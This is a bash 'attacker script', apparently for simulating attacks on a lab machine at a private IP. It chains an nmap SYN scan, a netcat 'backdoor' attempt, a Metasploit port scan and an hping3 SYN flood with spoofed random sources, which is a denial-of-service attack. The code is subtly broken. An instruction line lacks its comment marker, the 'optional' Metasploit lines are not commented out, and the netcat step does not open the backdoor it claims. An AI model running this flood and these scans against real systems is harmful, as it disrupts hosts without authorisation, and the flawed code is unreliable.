#!/bin/bash
# Attacker Script: Simulates various attacks on the Target machine.

TARGET_IP="192.168.1.4"  # Replace with the Target's IP.

echo "Starting attack simulation on Target: $TARGET_IP"

# 1. Nmap Port Scan
echo "[1] Performing Nmap SYN scan..."
nmap -sS $TARGET_IP -p 1-1000

# 2. Netcat Attempt to Open a Backdoor
echo "[2] Attempting to open a backdoor using Netcat..."
echo "Hacked!" | nc -lvp 1234 &  # Attacker listens on port 1234
nc $TARGET_IP 1234 -w 3

# 3. Metasploit Attack (Optional, requires Metasploit)
Uncomment the lines below if Metasploit is installed.
echo "[3] Launching Metasploit attack..."
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET_IP; set THREADS 5; run; exit;"

# 4. Custom Malicious Packet Generation (using hping3)
echo "[4] Sending malicious TCP packets using hping3..."
hping3 -S -p 80 --flood --rand-source $TARGET_IP

echo "Attack simulation completed."
